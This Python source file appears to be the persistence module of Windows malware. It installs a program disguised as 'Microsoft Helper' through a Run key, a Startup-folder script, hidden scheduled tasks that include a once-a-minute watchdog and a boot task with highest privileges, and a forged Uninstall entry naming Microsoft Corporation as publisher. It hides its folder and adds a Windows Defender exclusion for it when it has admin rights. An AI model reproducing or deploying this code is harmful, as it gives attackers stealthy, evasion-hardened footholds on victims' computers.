import ctypes
import os
import pathlib
import shutil
import sys
import winreg

from core import stealth
from core.paths import APP, FROZEN, runtime_dir
from core.util import run, run_ps

TASK = 'MicrosoftHelper'
TASKBOOT = 'MicrosoftHelperBoot'
WATCH = 'MicrosoftHelperWatch'
RUN_KEY = r'Software\Microsoft\Windows\CurrentVersion\Run'
UNINST_KEY = r'Software\Microsoft\Windows\CurrentVersion\Uninstall\MicrosoftHelper'

DIR = runtime_dir()
EXE = DIR / f'{APP}.exe'
VBS = DIR / f'{APP}.vbs'
WD = DIR / 'watchdog.vbs'


def _admin():
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def _launch():
    if FROZEN:
        return f'"{EXE}"'
    pyw = pathlib.Path(sys.executable).with_name('pythonw.exe')
    py = pyw if pyw.exists() else pathlib.Path(sys.executable)
    return f'"{py}" "{DIR / "main.py"}"'


def _q(s):
    return s.replace('"', '""')


def _stage():
    DIR.mkdir(parents=True, exist_ok=True)
    if FROZEN:
        me = pathlib.Path(sys.executable)
        if me.resolve() != EXE.resolve():
            shutil.copy2(me, EXE)
        s = me.parent / 'config.json'
        if s.exists():
            shutil.copy2(s, DIR / 'config.json')
    stealth.hide_path(DIR)


def _write_scripts():
    VBS.write_text(
        'Set s = CreateObject("WScript.Shell")\r\n'
        f's.CurrentDirectory = "{DIR}"\r\n'
        f's.Run "{_q(_launch())}", 0, False\r\n', 'utf-8')

    name = EXE.name if FROZEN else 'pythonw.exe'
    WD.write_text(
        'Set wmi = GetObject("winmgmts:\\\\.\\root\\cimv2")\r\n'
        f'Set q = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name=\'{name}\'")\r\n'
        'If q.Count = 0 Then\r\n'
        '  Set sh = CreateObject("WScript.Shell")\r\n'
        f'  sh.CurrentDirectory = "{DIR}"\r\n'
        f'  sh.Run "{_q(_launch())}", 0, False\r\n'
        'End If\r\n', 'utf-8')


def install():
    _stage()
    _write_scripts()

    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY, 0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, APP, 0, winreg.REG_SZ, f'wscript.exe //B "{VBS}"')
    except Exception:
        run(f'reg add "HKCU\\{RUN_KEY}" /v {APP} /t REG_SZ '
            f'/d "wscript.exe //B \\"{VBS}\\"" /f')

    try:
        startup = (pathlib.Path(os.environ['APPDATA']) / 'Microsoft' / 'Windows'
                   / 'Start Menu' / 'Programs' / 'Startup')
        shutil.copy2(VBS, startup / f'{APP}.vbs')
    except Exception:
        pass

    run(f'schtasks /create /tn {TASK} /tr "wscript.exe //B \\"{VBS}\\"" '
        f'/sc onlogon /delay 0000:20 /f /it')
    run(f'schtasks /create /tn {WATCH} /tr "wscript.exe //B \\"{WD}\\"" '
        f'/sc minute /mo 1 /f /it')
    run(f'schtasks /create /tn {TASKBOOT} /tr "wscript.exe //B \\"{VBS}\\"" '
        f'/sc onstart /delay 0000:45 /f /rl highest')

    run_ps(f'try{{Get-ScheduledTask -TaskName "{TASK}*" -EA 0|ForEach-Object{{'
           f'$_.Settings.Hidden=$true;$_|Set-ScheduledTask|Out-Null}}}}catch{{}}', 40)

    try:
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, UNINST_KEY) as k:
            winreg.SetValueEx(k, 'DisplayName', 0, winreg.REG_SZ, 'Microsoft Helper')
            winreg.SetValueEx(k, 'DisplayVersion', 0, winreg.REG_SZ, '10.0.19041.1')
            winreg.SetValueEx(k, 'Publisher', 0, winreg.REG_SZ, 'Microsoft Corporation')
            winreg.SetValueEx(k, 'InstallLocation', 0, winreg.REG_SZ, str(DIR))
            winreg.SetValueEx(k, 'UninstallString', 0, winreg.REG_SZ, f'"{EXE}" --uninstall')
            winreg.SetValueEx(k, 'NoRepair', 0, winreg.REG_DWORD, 1)
    except Exception:
        pass

    if _admin():
        run_ps(f'try{{Add-MpPreference -ExclusionPath "{DIR}" -EA 0}}catch{{}}', 30)

    return str(DIR)


def uninstall():
    run(f'schtasks /delete /tn {TASK} /f')
    run(f'schtasks /delete /tn {WATCH} /f')
    run(f'schtasks /delete /tn {TASKBOOT} /f')
    run(f'reg delete "HKCU\\{RUN_KEY}" /v {APP} /f')
    run(f'reg delete "HKCU\\{UNINST_KEY}" /f')
    try:
        (pathlib.Path(os.environ['APPDATA']) / 'Microsoft' / 'Windows' / 'Start Menu'
         / 'Programs' / 'Startup' / f'{APP}.vbs').unlink()
    except Exception:
        pass
    stealth.unhide_path(DIR)


def _has_run_key():
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY) as k:
            winreg.QueryValueEx(k, APP)
        return True
    except Exception:
        return False


def _tasks():
    out = run('schtasks /query /fo LIST 2>nul')
    return [t for t in (TASK, WATCH, TASKBOOT) if t in out]


def status():
    return {
        'dir': str(DIR),
        'exe': str(EXE),
        'exists': EXE.exists(),
        'run_key': _has_run_key(),
        'tasks': _tasks(),
        'admin': _admin(),
    }